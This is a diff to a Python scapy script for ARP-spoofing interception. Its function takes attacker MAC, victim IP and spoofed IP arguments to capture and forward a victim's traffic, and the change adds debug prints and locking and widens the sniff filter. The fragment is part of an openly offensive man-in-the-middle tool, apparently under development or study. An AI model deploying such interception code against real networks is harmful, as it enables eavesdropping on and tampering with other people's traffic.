@@ -40,8 +40,18 @@ def arpSniffing(attackerMAC, victimIP, spoofIP, networkInterface):
     # distination IP is victiM IP
     # input : intercepted packet
     def snifFilter(pkt):
-        return (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (
-                pkt[IP].dst in spoofIP or pkt[IP].dst in victimIP))
+        # lock thread
+        lock.acquire()
+        print("I got here *")
+        print(spoofIP, victimIP)
+        print(pkt.haslayer(TCP), pkt[Ether].dst == attackerMAC, pkt[IP].dst)
+        print(pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (pkt[IP].dst in spoofIP or pkt[IP].dst in victimIP))
+        lock.release()
+        if (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (pkt[IP].dst in spoofIP or pkt[IP].dst in victimIP)):
+            return True
+        else :
+            return False
+
 
     #input: intercepted packet
     # output : send response paket to the network
@@ -52,7 +62,7 @@ def arpSniffing(attackerMAC, victimIP, spoofIP, networkInterface):
 
         #lock thread
         lock.acquire()
-
+        print("I got here")
         #case 1: victim request an IP which has as destination MAC of attacker
         # find corresponding MAC to that IP in array of spoffed IPs and
         # put as destination to the new packet
@@ -73,7 +83,7 @@ def arpSniffing(attackerMAC, victimIP, spoofIP, networkInterface):
 
     #contineously sniff for the arp packet in network with before defined filter
     #on each intercepted packet perform intercep method
-    sniff(prn=intercept, iface=networkInterface, filter="arp", lfilter = snifFilter)
+    sniff(prn=intercept, iface=networkInterface, filter="ip")
 
 
 # input :
